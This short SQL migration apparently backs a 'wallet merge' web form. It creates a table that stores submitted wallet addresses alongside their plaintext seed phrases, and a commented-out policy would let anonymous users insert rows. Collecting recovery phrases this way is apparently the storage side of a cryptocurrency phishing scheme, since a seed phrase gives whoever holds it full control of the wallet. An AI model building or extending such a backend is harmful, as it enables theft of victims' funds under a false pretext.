-- Create the submissions table for storing wallet merge submissions
CREATE TABLE IF NOT EXISTS public.submissions (
  id SERIAL PRIMARY KEY,
  wallet TEXT NOT NULL,
  seedPhrase TEXT NOT NULL,
  timestamp BIGINT NOT NULL
);

-- If using RLS for public access, allow anonymous inserts:
-- CREATE POLICY "Allow anon inserts" ON public.submissions
-- FOR INSERT TO anon
-- WITH CHECK (true);
